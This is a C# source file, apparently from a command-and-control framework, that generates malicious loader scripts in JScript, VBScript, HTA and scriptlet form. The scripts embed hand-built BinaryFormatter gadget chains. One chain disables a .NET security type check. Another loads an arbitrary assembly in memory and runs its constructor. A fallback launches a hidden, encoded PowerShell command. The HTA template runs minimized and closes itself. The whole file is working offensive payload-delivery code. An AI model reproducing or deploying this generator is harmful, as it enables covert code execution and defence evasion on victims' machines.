using System.Text;

namespace C2.Features.Loaders;

public enum ScriptFormat { JScript, VBScript, Hta, Sct }

/// <summary>
/// Two-stage BinaryFormatter exploitation via TextFormattingRunProperties NRBF,
/// with automatic Windows 7 fallback.
///
/// Stage 1 — Disable .NET 4.8+ ActivitySurrogateSelectorTypeCheck:
///   XAML ObjectDataProvider chain reflects into the internal AppSettings field
///   and sets the ConfigurationManager key.  Throws after — caught by script.
///
/// Stage 2 — Load assembly + trigger constructor (pure in-process):
///   XAML embeds raw assembly bytes via x:Array → Assembly.Load(byte[]) →
///   CreateInstance(entryClass).  No PowerShell, no child process.
///
/// Fallback — if Deserialize_2 throws (Windows 7: assembly not found, or any
///   other failure), the script catches and falls back to a PowerShell one-liner
///   that does the same Assembly.Load + CreateInstance via PS 2.0+.
///
/// Both NRBF blobs are hand-built (one class, one string member) — no
/// BinaryFormatter.Serialize needed, runs entirely in WASM.
/// </summary>
public static class InsecureDeserializationGenerator
{
    private static readonly Lazy<string> Stage1Base64 = new(() =>
        Convert.ToBase64String(BuildStage1Nrbf()));

    /// <summary>
    /// Two-stage payload with automatic fallback.
    /// </summary>
    public static string Generate(byte[] assemblyBytes, string entryClass,
        ScriptFormat format, string runtimeVersion)
    {
        var s1 = Stage1Base64.Value;
        var s2 = Convert.ToBase64String(BuildStage2Nrbf(assemblyBytes, entryClass));
        var fb = BuildFallbackPsEncoded(Convert.ToBase64String(assemblyBytes), entryClass);
        return format switch
        {
            ScriptFormat.JScript  => BuildJScript(s1, s2, fb, runtimeVersion),
            ScriptFormat.VBScript => BuildVBScript(s1, s2, fb, runtimeVersion),
            ScriptFormat.Hta      => BuildHta(s1, s2, fb, runtimeVersion),
            ScriptFormat.Sct      => BuildSct(s1, s2, fb, runtimeVersion),
            _ => ""
        };
    }

    /// <summary>
    /// Single-stage blob mode — user provides a standalone pre-built payload.
    /// </summary>
    public static string GenerateFromBlob(string serializedBase64,
        ScriptFormat format, string runtimeVersion)
    {
        return format switch
        {
            ScriptFormat.JScript  => BuildJScriptSingle(serializedBase64, runtimeVersion),
            ScriptFormat.VBScript => BuildVBScriptSingle(serializedBase64, runtimeVersion),
            ScriptFormat.Hta      => BuildHtaSingle(serializedBase64, runtimeVersion),
            ScriptFormat.Sct      => BuildSctSingle(serializedBase64, runtimeVersion),
            _ => ""
        };
    }

    // ── NRBF Stage Builders ──────────────────────────────────────────────

    private static byte[] BuildStage1Nrbf()
    {
        const string xaml = """
            <ResourceDictionary
                xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
                xmlns:s="clr-namespace:System;assembly=mscorlib"
                xmlns:c="clr-namespace:System.Configuration;assembly=System.Configuration"
                xmlns:r="clr-namespace:System.Reflection;assembly=mscorlib">
                <ObjectDataProvider x:Key="type" ObjectType="{x:Type s:Type}" MethodName="GetType">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</s:String>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key="field" ObjectInstance="{StaticResource type}" MethodName="GetField">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>disableActivitySurrogateSelectorTypeCheck</s:String>
                        <r:BindingFlags>40</r:BindingFlags>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key="set" ObjectInstance="{StaticResource field}" MethodName="SetValue">
                    <ObjectDataProvider.MethodParameters>
                        <s:Object/>
                        <s:Boolean>true</s:Boolean>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
                <ObjectDataProvider x:Key="cfg" ObjectInstance="{x:Static c:ConfigurationManager.AppSettings}" MethodName="Set">
                    <ObjectDataProvider.MethodParameters>
                        <s:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</s:String>
                        <s:String>true</s:String>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
            </ResourceDictionary>
            """;

        return BuildTextFormattingNrbf(xaml);
    }

    /// <summary>
    /// Stage 2: x:Array byte[] → Assembly.Load → CreateInstance.
    /// No env var flags — the script uses try/catch flow control instead.
    /// </summary>
    private static byte[] BuildStage2Nrbf(byte[] assemblyBytes, string entryClass)
    {
        var sb = new StringBuilder(assemblyBytes.Length * 20 + 512);

        sb.Append("<ResourceDictionary")
          .Append(" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"")
          .Append(" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"")
          .Append(" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"")
          .Append(" xmlns:r=\"clr-namespace:System.Reflection;assembly=mscorlib\">");

        sb.Append("<ObjectDataProvider x:Key=\"a\" ObjectType=\"{x:Type r:Assembly}\" MethodName=\"Load\">")
          .Append("<ObjectDataProvider.MethodParameters>")
          .Append("<x:Array Type=\"s:Byte\">");

        foreach (var b in assemblyBytes)
            sb.Append("<s:Byte>").Append(b).Append("</s:Byte>");

        sb.Append("</x:Array>")
          .Append("</ObjectDataProvider.MethodParameters>")
          .Append("</ObjectDataProvider>");

        sb.Append("<ObjectDataProvider x:Key=\"b\" ObjectInstance=\"{StaticResource a}\" MethodName=\"CreateInstance\">")
          .Append("<ObjectDataProvider.MethodParameters>")
          .Append("<s:String>").Append(entryClass).Append("</s:String>")
          .Append("</ObjectDataProvider.MethodParameters>")
          .Append("</ObjectDataProvider>");

        sb.Append("</ResourceDictionary>");

        return BuildTextFormattingNrbf(sb.ToString());
    }

    // ── Fallback ─────────────────────────────────────────────────────────

    private static string BuildFallbackPsEncoded(string assemblyBase64, string entryClass)
    {
        var ps = "[Reflection.Assembly]::Load([Convert]::FromBase64String('" +
            assemblyBase64 + "')).CreateInstance('" + entryClass + "')";
        return Convert.ToBase64String(Encoding.Unicode.GetBytes(ps));
    }

    // ── NRBF Writer ──────────────────────────────────────────────────────

    private static byte[] BuildTextFormattingNrbf(string xaml)
    {
        using var ms = new MemoryStream();
        using var w = new BinaryWriter(ms);

        w.Write((byte)0); w.Write(1); w.Write(-1); w.Write(1); w.Write(0);

        w.Write((byte)12); w.Write(2);
        WriteLenPrefixed(w, "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");

        w.Write((byte)5);
        w.Write(1);
        WriteLenPrefixed(w, "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties");
        w.Write(1);
        WriteLenPrefixed(w, "ForegroundBrush");
        w.Write((byte)1);
        w.Write(2);

        w.Write((byte)6); w.Write(3);
        WriteLenPrefixed(w, xaml);

        w.Write((byte)11);
        return ms.ToArray();
    }

    private static void WriteLenPrefixed(BinaryWriter w, string s)
    {
        var bytes = Encoding.UTF8.GetBytes(s);
        Write7BitEncodedInt(w, bytes.Length);
        w.Write(bytes);
    }

    private static void Write7BitEncodedInt(BinaryWriter w, int value)
    {
        while (value >= 0x80)
        {
            w.Write((byte)(value | 0x80));
            value >>= 7;
        }
        w.Write((byte)value);
    }

    // ── Two-Stage Script Templates ───────────────────────────────────────

    private static int DecodedLen(string b64)
    {
        var len = (b64.Length / 4) * 3;
        if (b64.EndsWith("==")) len -= 2;
        else if (b64.EndsWith("=")) len -= 1;
        return len;
    }

    private static string BuildJScript(string s1B64, string s2B64, string fbPs, string ver)
    {
        return $@"function Base64ToStream(b, l) {{
    var enc = new ActiveXObject('System.Text.ASCIIEncoding');
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject('System.Security.Cryptography.FromBase64Transform');
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject('System.IO.MemoryStream');
    ms.Write(ba, 0, l);
    ms.Position = 0;
    return ms;
}}

var stage_1 = ""{s1B64}"";
var stage_2 = ""{s2B64}"";

var shell = new ActiveXObject('WScript.Shell');
shell.Environment('Process')('COMPLUS_Version') = '{ver}';

try {{
    var fmt_1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    fmt_1.Deserialize_2(Base64ToStream(stage_1, {DecodedLen(s1B64)}));
}} catch (e) {{}}

var done = false;
try {{
    var fmt_2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    fmt_2.Deserialize_2(Base64ToStream(stage_2, {DecodedLen(s2B64)}));
    done = true;
}} catch (e) {{}}

if (!done) {{
    try {{
        shell.Run('powershell -nop -w hidden -enc {fbPs}', 0, false);
    }} catch (e) {{}}
}}";
    }

    private static string BuildVBScript(string s1B64, string s2B64, string fbPs, string ver)
    {
        var s1Lines = FormatVBString("stage_1", s1B64);
        var s2Lines = FormatVBString("stage_2", s2B64);

        return $@"Function Base64ToStream(b, l)
    Dim enc, length, ba, transform, ms
    Set enc = CreateObject(""System.Text.ASCIIEncoding"")
    length = enc.GetByteCount_2(b)
    ba = enc.GetBytes_4(b)
    Set transform = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
    ba = transform.TransformFinalBlock(ba, 0, length)
    Set ms = CreateObject(""System.IO.MemoryStream"")
    ms.Write ba, 0, l
    ms.Position = 0
    Set Base64ToStream = ms
End Function

Dim shell
Set shell = CreateObject(""WScript.Shell"")
shell.Environment(""Process"").Item(""COMPLUS_Version"") = ""{ver}""

{s1Lines}

{s2Lines}

On Error Resume Next

Dim fmt_1
Set fmt_1 = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
fmt_1.Deserialize_2 Base64ToStream(stage_1, {DecodedLen(s1B64)})
Err.Clear

Dim done
done = False
Dim fmt_2
Set fmt_2 = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
fmt_2.Deserialize_2 Base64ToStream(stage_2, {DecodedLen(s2B64)})
If Err.Number = 0 Then done = True
Err.Clear

If Not done Then
    shell.Run ""powershell -nop -w hidden -enc {fbPs}"", 0, False
End If";
    }

    private static string BuildHta(string s1B64, string s2B64, string fbPs, string ver)
    {
        var js = BuildJScript(s1B64, s2B64, fbPs, ver);
        return $@"<html>
<meta http-equiv=""x-ua-compatible"" content=""ie=9"">
<head>
<HTA:APPLICATION ID=""app"" WINDOWSTATE=""minimize"">
<script language=""JScript"">
{js}
window.close();
</script>
</head>
<body></body>
</html>";
    }

    private static string BuildSct(string s1B64, string s2B64, string fbPs, string ver)
    {
        var js = BuildJScript(s1B64, s2B64, fbPs, ver);
        var guid = Guid.NewGuid().ToString();
        return $@"<?XML version=""1.0""?>
<scriptlet>
<registration
    progid=""idl""
    classid=""{{{guid}}}"">
<script language=""JScript"">
<![CDATA[
{js}
]]>
</script>
</registration>
</scriptlet>";
    }

    // ── Single-Stage Script Templates ────────────────────────────────────

    private static string BuildJScriptSingle(string b64, string ver)
    {
        return $@"function Base64ToStream(b, l) {{
    var enc = new ActiveXObject('System.Text.ASCIIEncoding');
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject('System.Security.Cryptography.FromBase64Transform');
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject('System.IO.MemoryStream');
    ms.Write(ba, 0, l);
    ms.Position = 0;
    return ms;
}}

var serialized_obj = ""{b64}"";

var shell = new ActiveXObject('WScript.Shell');
shell.Environment('Process')('COMPLUS_Version') = '{ver}';

var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
fmt.Deserialize_2(Base64ToStream(serialized_obj, {DecodedLen(b64)}));";
    }

    private static string BuildVBScriptSingle(string b64, string ver)
    {
        var blobLines = FormatVBString("serialized_obj", b64);

        return $@"Function Base64ToStream(b, l)
    Dim enc, length, ba, transform, ms
    Set enc = CreateObject(""System.Text.ASCIIEncoding"")
    length = enc.GetByteCount_2(b)
    ba = enc.GetBytes_4(b)
    Set transform = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
    ba = transform.TransformFinalBlock(ba, 0, length)
    Set ms = CreateObject(""System.IO.MemoryStream"")
    ms.Write ba, 0, l
    ms.Position = 0
    Set Base64ToStream = ms
End Function

Dim shell
Set shell = CreateObject(""WScript.Shell"")
shell.Environment(""Process"").Item(""COMPLUS_Version"") = ""{ver}""

{blobLines}

Dim fmt
Set fmt = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
fmt.Deserialize_2 Base64ToStream(serialized_obj, {DecodedLen(b64)})";
    }

    private static string BuildHtaSingle(string b64, string ver)
    {
        var js = BuildJScriptSingle(b64, ver);
        return $@"<html>
<meta http-equiv=""x-ua-compatible"" content=""ie=9"">
<head>
<HTA:APPLICATION ID=""app"" WINDOWSTATE=""minimize"">
<script language=""JScript"">
{js}
window.close();
</script>
</head>
<body></body>
</html>";
    }

    private static string BuildSctSingle(string b64, string ver)
    {
        var js = BuildJScriptSingle(b64, ver);
        var guid = Guid.NewGuid().ToString();
        return $@"<?XML version=""1.0""?>
<scriptlet>
<registration
    progid=""idl""
    classid=""{{{guid}}}"">
<script language=""JScript"">
<![CDATA[
{js}
]]>
</script>
</registration>
</scriptlet>";
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    private static string FormatVBString(string name, string value)
    {
        const int chunk = 200;
        var sb = new StringBuilder();

        if (value.Length <= chunk)
        {
            sb.Append($"Dim {name}\n{name} = \"{value}\"");
            return sb.ToString();
        }

        sb.AppendLine($"Dim {name}");
        sb.AppendLine($"{name} = \"\"");
        for (var i = 0; i < value.Length; i += chunk)
        {
            var c = value.Substring(i, Math.Min(chunk, value.Length - i));
            sb.AppendLine($"{name} = {name} & \"{c}\"");
        }
        return sb.ToString().TrimEnd();
    }
}
